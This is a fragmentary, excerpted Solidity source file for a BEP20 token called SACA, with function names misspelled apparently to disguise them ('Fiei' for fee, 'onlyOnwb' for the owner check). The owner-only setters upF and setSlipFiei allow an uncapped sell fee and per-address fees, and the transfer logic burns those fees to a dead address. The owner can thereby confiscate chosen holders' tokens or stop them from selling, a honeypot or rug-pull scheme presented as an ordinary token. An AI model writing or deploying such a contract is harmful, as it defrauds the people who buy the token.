...
interface IUniswapV2Factory {
    ...
    function FieiTo() external view returns (address);
    function FieiToSetter() external view returns (address);
    ...
    function setFieiTo(address) external;
    function setFieiToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFieiOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountNumberTokenMin,
        uint AmountNumberETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingFieiOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountNumberTokenMin,
        uint AmountNumberETHMin,
    ...
    function swapExactTokensForTokensSupportingFieiOnTransferTokens(
        uint AmountNumberIn,
        uint AmountNumberOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingFieiOnTransferTokens(
        uint AmountNumberOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFieiOnTransferTokens(
        uint AmountNumberIn,
        uint AmountNumberOutMin,
        address[] calldata path,
        address to,
...
contract SACA is BEP20, Ownable {
    // ext
    ...
    function _Mnti(address account, uint256 AmountNumber) internal virtual {
    ...
    uint256 private _defaultSellFiei = 0;

    uint256 private _defaultBuyFiei = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipFiei;
    ...
    function setPairList(address _address) external onlyOnwb {
        uniswapV2Pair = _address;
    }


    function upF(uint256 _value) external onlyOnwb {
        _defaultSellFiei = _value;
    }

    function setSlipFiei(address _address, uint256 _value) external onlyOnwb {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipFiei[_address] = _value;
    }

    function getSlipFiei(address _address) external view onlyOnwb returns (uint256) {
        return _slipFiei[_address];
    }


    function setMAccountFiei(address _address, bool _value) external onlyOnwb {
        _mAccount[_address] = _value;
    }

    function getMAccountFiei(address _address) external view onlyOnwb returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeFieiAmountNumber = 0;
        ...
        if (rF) {
            ...
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                    ...
                    tradeFiei = _defaultSellFiei;
                }
                if (from == uniswapV2Pair) {

                    tradeFiei = _defaultBuyFiei;
                }
            }
            if (_slipFiei[from] > 0) {
                tradeFiei = _slipFiei[from];
            }

            tradeFieiAmountNumber = _AmountNumber.mul(tradeFiei).div(100);
        }


        if (tradeFieiAmountNumber > 0) {
            _balances[from] = _balances[from].sub(tradeFieiAmountNumber);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFieiAmountNumber);
            emit Transfer(from, _deadAddress, tradeFieiAmountNumber);
        }

        _balances[from] = _balances[from].sub(_AmountNumber - tradeFieiAmountNumber);
        _balances[_to] = _balances[_to].add(_AmountNumber - tradeFieiAmountNumber);
        emit Transfer(from, _to, _AmountNumber - tradeFieiAmountNumber);
    }
